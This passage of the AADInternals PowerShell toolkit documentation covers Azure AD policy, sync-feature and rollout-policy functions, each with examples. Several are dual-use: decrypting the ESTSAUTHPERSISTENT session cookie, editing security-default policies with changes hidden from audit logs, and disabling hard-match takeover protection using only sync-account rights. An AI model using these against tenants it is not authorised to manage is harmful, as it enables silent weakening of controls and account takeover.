<span class="nb">Search-AADIntUnifiedAuditLog</span> <span class="n">-Cookies</span> <span class="nv">$cookies</span> <span class="n">-Verbose</span> <span class="n">-Start</span> <span class="p">(</span><span class="nb">get-date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(-</span><span class="n">90</span><span class="p">)</span> <span class="n">-All</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">auditlog</span><span class="p">.</span><span class="n">json</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintconditionalaccesspolicies-a">Get-AADIntConditionalAccessPolicies (A)</h3>

<p>Since version 0.4.7 <br>
Shows conditional access policies.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List the conditional access policies</span>
<span class="nb">Get-AADIntConditionalAccessPolicies</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 1a6a3b84-7d6d-4398-9c26-50fab315be8b
deletionTimestamp   : 
displayName         : Default Policy
keyCredentials      : {}
policyType          : 18
policyDetail        : {{"Version":0,"State":"Disabled"}}
policyIdentifier    : 2022-11-18T00:16:20.2379877Z
tenantDefaultPolicy : 18

odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 7f6ac8e5-bd21-4091-ae4c-0e48e0f4db04
deletionTimestamp   : 
displayName         : Block NestorW
keyCredentials      : {}
policyType          : 18
policyDetail        : {{"Version":1,"CreatedDateTime":"2022-11-18T00:16:19.461967Z","State":"Enabled
					  ","Conditions":{"Applications":{"Include":[{"Applications":["None"]}]},"Users"
					  :{"Include":[{"Users":["8ab3ed0d-6668-49f7-a108-c50bb230c870"]}]}},"Controls":
					  [{"Control":["Block"]}],"EnforceAllPoliciesForEas":true,"IncludeOtherLegacyCli
					  entTypeForEvaluation":true}}
policyIdentifier    : 
tenantDefaultPolicy :
</code></pre>

<h3 id="get-aadintazureadpolicies-a">Get-AADIntAzureADPolicies (A)</h3>

<p>Since version 0.8.0 <br>
Shows Azure AD policies.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List Azure AD policies</span>
<span class="nb">Get-AADIntAzureADPolicies</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : e35e4cd3-53f8-4d65-80bb-e3279c2c1b71
deletionTimestamp   : 
displayName         : On-Premise Authentication Flow Policy
keyCredentials      : {**}
policyType          : 8
policyDetail        : {**}
policyIdentifier    : 
tenantDefaultPolicy : 8

odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 259b810f-fb50-4e57-925b-ec2292c17883
deletionTimestamp   : 
displayName         : 2/5/2021 5:53:07 AM
keyCredentials      : {}
policyType          : 10
policyDetail        : {{"SecurityPolicy":{"Version":0,"SecurityDefaults":{"IgnoreBaselineProtectionPolicies":true,"I
					  sEnabled":false}}}}
policyIdentifier    : 
tenantDefaultPolicy : 10
</code></pre>

<h3 id="set-aadintazureadpolicydetails-a">Set-AADIntAzureADPolicyDetails (A)</h3>

<p>Since version 0.8.0 <br></p>

<p>Sets Azure AD policy details using Azure AD Graph API.
This allows admins to modify policy details, including metadata of Conditional Access policies.
Modifications are logged to audit log, but the modified properties are not shown.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List Azure AD policies</span>
<span class="nb">Get-AADIntAzureADPolicies</span>
</code></pre></div>
<p></p>

<pre><code>odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : e35e4cd3-53f8-4d65-80bb-e3279c2c1b71
deletionTimestamp   : 
displayName         : On-Premise Authentication Flow Policy
keyCredentials      : {**}
policyType          : 8
policyDetail        : {**}
policyIdentifier    : 
tenantDefaultPolicy : 8

odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 259b810f-fb50-4e57-925b-ec2292c17883
deletionTimestamp   : 
displayName         : 2/5/2021 5:53:07 AM
keyCredentials      : {}
policyType          : 10
policyDetail        : {{"SecurityPolicy":{"Version":0,"SecurityDefaults":{"IgnoreBaselineProtectionPolicies":true,"IsEnabled":true}}}}
policyIdentifier    : 
tenantDefaultPolicy : 10
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Modify policy detail</span>
<span class="nb">Set-AADIntAzureADPolicyDetail</span> <span class="n">-ObjectId</span> <span class="s2">"259b810f-fb50-4e57-925b-ec2292c17883"</span> <span class="n">-PolicyDetail</span> <span class="s1">'{{"SecurityPolicy":{"Version":0,"SecurityDefaults":{"IgnoreBaselineProtectionPolicies":true,"IsEnabled":false}}}}'</span>
</code></pre></div>


<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Modify policy detail and display name</span>
<span class="nb">Set-AADIntAzureADPolicyDetail</span> <span class="n">-ObjectId</span> <span class="s2">"259b810f-fb50-4e57-925b-ec2292c17883"</span> <span class="n">-PolicyDetail</span> <span class="s1">'{{"SecurityPolicy":{"Version":0,"SecurityDefaults":{"IgnoreBaselineProtectionPolicies":true,"IsEnabled":false}}}}'</span> <span class="n">-displayName</span> <span class="s2">"My Policy"</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintselfservicepurchaseproducts-cm">Get-AADIntSelfServicePurchaseProducts (CM)</h3>

<p>Since version 0.6.2 <br>
Lists the status of self-service purchase products.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSCommerce</span> <span class="n">-SaveToCache</span>

<span class="c"># List the self-service purchase products</span>
<span class="nb">Get-AADIntSelfServicePurchaseProducts</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Product                                          Id           Status 
-------                                          --           ------ 
Windows 365 Enterprise                           CFQ7TTC0HHS9 Enabled
Windows 365 Business with Windows Hybrid Benefit CFQ7TTC0HX99 Enabled
Windows 365 Business                             CFQ7TTC0J203 Enabled
Power Automate per user                          CFQ7TTC0KP0N Enabled
Power Apps per user                              CFQ7TTC0KP0P Enabled
Power Automate RPA                               CFQ7TTC0KXG6 Enabled
Power BI Premium (standalone)                    CFQ7TTC0KXG7 Enabled
Visio Plan 2                                     CFQ7TTC0KXN8 Enabled
Visio Plan 1                                     CFQ7TTC0KXN9 Enabled
Project Plan 3                                   CFQ7TTC0KXNC Enabled
Project Plan 1                                   CFQ7TTC0KXND Enabled
Power BI Pro                                     CFQ7TTC0L3PB Enabled
</code></pre>

<h3 id="set-aadintselfservicepurchaseproduct-cm">Set-AADIntSelfServicePurchaseProduct (CM)</h3>

<p>Since version 0.6.2 <br>
Change the status of the given self-service purchase product.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSCommerce</span> <span class="n">-SaveToCache</span>

<span class="c"># Disable self-service purchase for Power BI Pro</span>
<span class="nb">Set-AADIntSelfServicePurchaseProduct</span> <span class="n">-Id</span> <span class="n">CFQ7TTC0L3PB</span> <span class="n">-Enabled</span> <span class="nv">$false</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Product      Id           Status 
-------      --           ------ 
Power BI Pro CFQ7TTC0L3PB Disabled
</code></pre>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Disable self-service purchase for all products</span>
<span class="nb">Get-AADIntSelfServicePurchaseProducts</span> <span class="p">|</span> <span class="nb">Set-AADIntSelfServicePurchaseProduct</span> <span class="n">-Enabled</span> <span class="nv">$false</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Product                                          Id           Status  
-------                                          --           ------  
Windows 365 Enterprise                           CFQ7TTC0HHS9 Disabled
Windows 365 Business with Windows Hybrid Benefit CFQ7TTC0HX99 Disabled
Windows 365 Business                             CFQ7TTC0J203 Disabled
Power Automate per user                          CFQ7TTC0KP0N Disabled
Power Apps per user                              CFQ7TTC0KP0P Disabled
Power Automate RPA                               CFQ7TTC0KXG6 Disabled
Power BI Premium (standalone)                    CFQ7TTC0KXG7 Disabled
Visio Plan 2                                     CFQ7TTC0KXN8 Disabled
Visio Plan 1                                     CFQ7TTC0KXN9 Disabled
Project Plan 3                                   CFQ7TTC0KXNC Disabled
Project Plan 1                                   CFQ7TTC0KXND Disabled
Power BI Pro                                     CFQ7TTC0L3PB Disabled
</code></pre>

<h3 id="unprotect-aadintestsauthpersistentcookie">Unprotect-AADIntEstsAuthPersistentCookie (*)</h3>

<p>Since version 0.6.8 <br>
Decrypts and dumps users stored in ESTSAUTHPERSISTENT.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Decrypt the ESTSAUTHPERSISTENT cookie</span>
<span class="nb">Unprotect-AADIntEstsAuthPersistentCookie</span> <span class="n">-Cookie</span> <span class="n">0</span><span class="p">.</span><span class="n">ARMAqlCH3MZuvUCNgTAd4B7IRffhvoluXopNnz3s1gEl</span><span class="p">...</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>name       : Some User
login      : user@company.com
imageAAD   : work_account.png
imageMSA   : personal_account.png
isLive     : False
isGuest    : False
link       : user@company.com
authUrl    : 
isSigned   : True
sessionID  : 1fb5e6b3-09a4-4ceb-bcad-3d6d0ee89bf7
domainHint : 
isWindows  : False

name       : Another User
login      : user2@company.com
imageAAD   : work_account.png
imageMSA   : personal_account.png
isLive     : False
isGuest    : False
link       : user2@company.com
authUrl    : 
isSigned   : False
sessionID  : 1fb5e6b3-09a4-4ceb-bcad-3d6d0ee89bf7
domainHint : 
isWindows  : False
</code></pre>

<h3 id="get-aadintsyncfeatures-a">Get-AADIntSyncFeatures (A)</h3>

<p>Since version 0.6.7 <br>
Show the status of synchronisation features.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List the status of the sync features</span>
<span class="nb">Get-AADIntSyncFeatures</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>BlockCloudObjectTakeoverThroughHardMatch         : True
BlockSoftMatch                                   : False
DeviceWriteback                                  : False
DirectoryExtensions                              : False
DuplicateProxyAddressResiliency                  : True
DuplicateUPNResiliency                           : True
EnableSoftMatchOnUpn                             : True
EnableUserForcePasswordChangeOnLogon             : False
EnforceCloudPasswordPolicyForPasswordSyncedUsers : False
PassThroughAuthentication                        : False
PasswordHashSync                                 : True
PasswordWriteBack                                : False
SynchronizeUpnForManagedUsers                    : True
UnifiedGroupWriteback                            : False
UserWriteback                                    : False
</code></pre>

<h3 id="set-aadintsyncfeatures-a">Set-AADIntSyncFeatures (A)</h3>

<p>Since version 0.6.7 <br>
Enables or disables synchronisation features using Azure AD Sync API.
As such, doesn’t require “Global Administrator” credentials, “Directory Synchronization Accounts” credentials will do.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Enable PHS and disable BlockCloudObjectTakeoverThroughHardMatch</span>
<span class="nb">Set-AADIntSyncFeature</span> <span class="n">-EnableFeatures</span> <span class="n">PasswordHashSync</span> <span class="n">-DisableFeatures</span> <span class="n">BlockCloudObjectTakeoverThroughHardMatch</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>BlockCloudObjectTakeoverThroughHardMatch         : True
BlockSoftMatch                                   : False
DeviceWriteback                                  : False
DirectoryExtensions                              : False
DuplicateProxyAddressResiliency                  : True
DuplicateUPNResiliency                           : True
EnableSoftMatchOnUpn                             : True
EnableUserForcePasswordChangeOnLogon             : False
EnforceCloudPasswordPolicyForPasswordSyncedUsers : False
PassThroughAuthentication                        : False
PasswordHashSync                                 : True
PasswordWriteBack                                : False
SynchronizeUpnForManagedUsers                    : True
UnifiedGroupWriteback                            : False
UserWriteback                                    : False
</code></pre>

<h3 id="get-aadinttenantorganisationinformation-ad">Get-AADIntTenantOrganisationInformation (AD)</h3>

<p>Since version 0.6.7 <br>
Returns organisation information for the given tenant using commercial API used to get Partner Tenant information. Requires admin rights.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the tenant information</span>
<span class="nb">Get-AADIntTenantOrganisationInformation</span> <span class="n">-Domain</span> <span class="s2">"company.com"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>TenantId         : 043050e2-7993-416a-ae66-108ab1951612
CompanyName      : Company Ltd
StreetAddress    : 10 Wall Street
ApartmentOrSuite : 666
City             : New York
StateOrProvince  : NY
PostalCode       : 10005
CountryCode      : US
PhoneNumber      : 
FirstName        : 
LastName         : 
</code></pre>

<h3 id="get-aadintazureadfeatures-a">Get-AADIntAzureADFeatures (A)</h3>

<p>Since version 0.9.3 <br>
Show the status of Azure AD features.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Show status of Azure AD features</span>
<span class="nb">Get-AADIntAzureADFeatures</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Feature                                             Enabled
-------                                             -------
AllowEmailVerifiedUsers                                True
AllowInvitations                                       True
AllowMemberUsersToInviteOthersAsMembers               False
AllowUsersToChangeTheirDisplayName                    False
B2CFeature                                            False
BlockAllTenantAuth                                    False
ConsentedForMigrationToPublicCloud                    False
CIAMFeature                                           False
CIAMTrialFeature                                      False
CIAMTrialUpgrade                                      False
EnableExchangeDualWrite                               False
EnableHiddenMembership                                False
EnableSharedEmailDomainApis                           False
EnableWindowsLegacyCredentials                        False
EnableWindowsSupplementalCredentials                  False
ElevatedGuestsAccessEnabled                           False
ExchangeDualWriteUsersV1                              False
GuestsCanInviteOthersEnabled                           True
InvitationsEnabled                                     True
LargeScaleTenant                                      False
TestTenant                                            False
USGovTenant                                           False
DisableOnPremisesWindowsLegacyCredentialsSync         False
DisableOnPremisesWindowsSupplementalCredentialsSync   False
RestrictPublicNetworkAccess                           False
AutoApproveSameTenantRequests                         False
RedirectPpeUsersToMsaInt                              False
LegacyTlsExceptionForEsts                             False
LegacyTlsBlockForEsts                                 False
TenantAuthBlockReasonFraud                            False
TenantAuthBlockReasonLifecycle                        False
TenantExcludeDeprecateAADLicenses                     False
</code></pre>

<h3 id="get-aadintazureadfeature-a">Get-AADIntAzureADFeature (A)</h3>

<p>Since version 0.9.3 <br>
Show the status of given Azure AD feature.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Show status of Azure AD feature</span>
<span class="nb">Get-AADIntAzureADFeature</span> <span class="n">-Feature</span> <span class="s2">"B2CFeature"</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>False
</code></pre>

<h3 id="set-aadintazureadfeature-a">Set-AADIntAzureADFeature (A)</h3>

<p>Since version 0.9.3 <br>
Enables or disables the given Azure AD feature.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Enable Azure AD feature</span>
<span class="nb">Set-AADIntAzureADFeature</span> <span class="n">-Feature</span> <span class="s2">"B2CFeature"</span> <span class="n">-Enable</span> <span class="nv">$true</span>
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>Feature      Enabled
-------      -------
B2CFeature      True
</code></pre>

<h2 id="rollout-policy-functions">Rollout policy functions</h2>

<p><strong>Rollout policy</strong> functions allows manipulating rollout policies. You list, create, edit, and delete policies. You can also add or remove groups from policies.</p>

<p>When rollout policy is disabled from Azure Admin center, it still exists in Azure AD even though it is not visible. AADInternals allows you to list and delete also these policies.</p>

<h3 id="get-aadintrolloutpolicies-m">Get-AADIntRolloutPolicies (M)</h3>

<p>Since version 0.4.5 <br>
Gets the tenant’s rollout policies. Rollout policies allows organisations to transition from federation to cloud authentication in stages.
This function can be used to list rollout policies not visible in Azure Admin center.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List the rollout policies</span>
<span class="nb">Get-AADIntRolloutPolicies</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
</code></pre>

<h3 id="set-aadintrolloutpolicy-m">Set-AADIntRolloutPolicy (M)</h3>

<p>Since version 0.4.5 <br>
Creates a new rollout policy or edits existing one. Supported policy types are passwordHashSync (PHS), passthroughAuthentication (PTA), and seamlessSso (SSSO)</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Create a new PTA rollout policy</span>
<span class="nb">Set-AADIntRolloutPolicy</span> <span class="n">-Policy</span> <span class="n">passthroughAuthentication</span> <span class="n">-Enable</span> <span class="nv">$true</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>@odata.context          : https://graph.microsoft.com/beta/$metadata#directory/featureRolloutPolicies/$entity
id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False
</code></pre>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List the rollout policies</span>
<span class="nb">Get-AADIntRolloutPolicies</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Disable PTA policy</span>
<span class="nb">Set-AADIntRolloutPolicy</span> <span class="n">-PolicyId</span> <span class="n">cdcb37e1</span><span class="p">-</span><span class="n">9c4a</span><span class="p">-</span><span class="n">4de9-a7f5</span><span class="p">-</span><span class="n">65fdf9f6241d</span> <span class="n">-Enable</span> <span class="nv">$False</span>
</code></pre></div>


<h3 id="remove-aadintrolloutpolicy-m">Remove-AADIntRolloutPolicy (M)</h3>

<p>Since version 0.4.5 <br>
Removes the given rollout policy. The policy MUST be disabled before it can be removed. If not, it won’t be removed but no error is given.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List the rollout policies</span>
<span class="nb">Get-AADIntRolloutPolicies</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Remove PTA policy</span>
<span class="nb">Remove-AADIntRolloutPolicy</span> <span class="n">-PolicyId</span> <span class="n">cdcb37e1</span><span class="p">-</span><span class="n">9c4a</span><span class="p">-</span><span class="n">4de9-a7f5</span><span class="p">-</span><span class="n">65fdf9f6241d</span>
</code></pre></div>


<h3 id="get-aadintrolloutpolicygroups-m">Get-AADIntRolloutPolicyGroups (M)</h3>

<p>Since version 0.4.5 <br>
Lists the groups of the given rollout policy.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List the rollout policies</span>
<span class="nb">Get-AADIntRolloutPolicies</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List the groups of PTA policy</span>
<span class="nb">Get-AADIntRolloutPolicyGroups</span> <span class="n">-PolicyId</span> <span class="n">cdcb37e1</span><span class="p">-</span><span class="n">9c4a</span><span class="p">-</span><span class="n">4de9-a7f5</span><span class="p">-</span><span class="n">65fdf9f6241d</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>displayName       id
-----------       --
PTA SSO Sales     b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3
PTA SSO Marketing f35d712f-dcdb-4040-a93d-ffd04aff3f75
</code></pre>

<h3 id="add-aadintrolloutpolicygroups-m">Add-AADIntRolloutPolicyGroups (M)</h3>

<p>Since version 0.4.5 <br>
Adds given groups to the given rollout policy.</p>

<p>Return value meanings:</p>

<table>
<thead>
<tr>
<th>Status</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>204</td>
<td>The group successfully added</td>
</tr>

<tr>
<td>400</td>
<td>Invalid group id</td>
</tr>

<tr>
<td>404</td>
<td>Invalid policy id</td>
</tr>
</tbody>
</table>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List the rollout policies</span>
<span class="nb">Get-AADIntRolloutPolicies</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Add two groups to the PTA policy</span>
<span class="nb">Add-AADIntRolloutPolicyGroups</span> <span class="n">-PolicyId</span> <span class="n">cdcb37e1</span><span class="p">-</span><span class="n">9c4a</span><span class="p">-</span><span class="n">4de9-a7f5</span><span class="p">-</span><span class="n">65fdf9f6241d</span> <span class="n">-GroupIds</span> <span class="n">b9faf3ba-db5f</span><span class="p">-</span><span class="n">4ed2-b9c8</span><span class="p">-</span><span class="n">0fd5916de1f3</span><span class="p">,</span><span class="n">f35d712f-dcdb</span><span class="p">-</span><span class="n">4040-a93d-ffd04aff3f75</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>id                                   status
--                                   ------
b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3    204
f35d712f-dcdb-4040-a93d-ffd04aff3f75    204
</code></pre>

<h3 id="remove-aadintrolloutpolicygroups-m">Remove-AADIntRolloutPolicyGroups (M)</h3>

<p>Since version 0.4.5 <br>
Removes given groups from the given rollout policy.</p>

<p>Return value meanings:</p>

<table>
<thead>
<tr>
<th>Status</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>204</td>
<td>The group successfully added</td>
</tr>

<tr>
<td>400</td>
<td>Invalid group id</td>
</tr>

<tr>
<td>404</td>
<td>Invalid policy id</td>
</tr>
</tbody>
</table>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List the rollout policies</span>
<span class="nb">Get-AADIntRolloutPolicies</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                      : cdcb37e1-9c4a-4de9-a7f5-65fdf9f6241d
displayName             : passthroughAuthentication rollout policy
description             :
feature                 : passthroughAuthentication
isEnabled               : True
isAppliedToOrganization : False

id                      : 3c89cd34-275c-4cba-8d8e-80338db7df91
displayName             : seamlessSso rollout policy
description             :
feature                 : seamlessSso
isEnabled               : True
isAppliedToOrganization : False
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List the groups of PTA policy</span>
<span class="nb">Get-AADIntRolloutPolicyGroups</span> <span class="n">-PolicyId</span> <span class="n">cdcb37e1</span><span class="p">-</span><span class="n">9c4a</span><span class="p">-</span><span class="n">4de9-a7f5</span><span class="p">-</span><span class="n">65fdf9f6241d</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>displayName       id
-----------       --
PTA SSO Sales     b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3
PTA SSO Marketing f35d712f-dcdb-4040-a93d-ffd04aff3f75
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Remove "PTA SSO Sales" and "PTA SSO Marketing" groups from PTA policy</span>
<span class="nb">Remove-AADIntRolloutPolicyGroups</span> <span class="n">-PolicyId</span> <span class="n">cdcb37e1</span><span class="p">-</span><span class="n">9c4a</span><span class="p">-</span><span class="n">4de9-a7f5</span><span class="p">-</span><span class="n">65fdf9f6241d</span> <span class="n">-GroupIds</span> <span class="n">b9faf3ba-db5f</span><span class="p">-</span><span class="n">4ed2-b9c8</span><span class="p">-</span><span class="n">0fd5916de1f3</span><span class="p">,</span><span class="n">f35d712f-dcdb</span><span class="p">-</span><span class="n">4040-a93d-ffd04aff3f75</span>
</code></pre></div>


<p><strong>Output:</strong></p>

<pre><code>id                                   status
--                                   ------
b9faf3ba-db5f-4ed2-b9c8-0fd5916de1f3    204
f35d712f-dcdb-4040-a93d-ffd04aff3f75    204
</code></pre>

<h2 id="utilities">Utilities</h2>

<p><strong>Utilities</strong> provide the functionality for troubleshooting etc.</p>

<h3 id="read-aadintaccesstoken">Read-AADIntAccesstoken (*)</h3>

<p>This function show access (and id and refresh) token information. For debugging, the most important values are the audience (aud) and the issuer (iss).
Use -validate switch to validate the signature and to check the expiration.</p>

<p>You can also show details from the token copied from the browser session’s <strong>authorization</strong> -header.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show access token information</span>
<span class="nv">$at</span> <span class="p">=</span> <span class="nb">Get-AADIntAccessTokenForAADGraph</span>
<span class="nb">Read-AADIntAccesstoken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<p><strong>Output1:</strong></p>

<pre><code>aud                 : https://graph.windows.net
iss                 : https://sts.windows.net/fe177079-66f4-4f9f-bcb6-e085b92e3c8a/
iat                 : 1540478026
nbf                 : 1540478026
exp                 : 1540481926
acr                 : 1
aio                 : ASQA2/8JAAAAXhS3vMo2OGlXvBZG0tScm9njsJUDhvoHtwdSlUx2Jvg=
amr                 : {pwd}
appid               : 1b730954-1685-4b74-9bfd-dac224a7b894
appidacr            : 0
family_name         : demo
given_name          : admin
ipaddr              : 127.0.0.1
name                : admin demo
oid                 : 69be7da7-e29f-4753-b8c7-0417a63a1804
puid                : 1003BFFDABE606EE
scp                 : user_impersonation
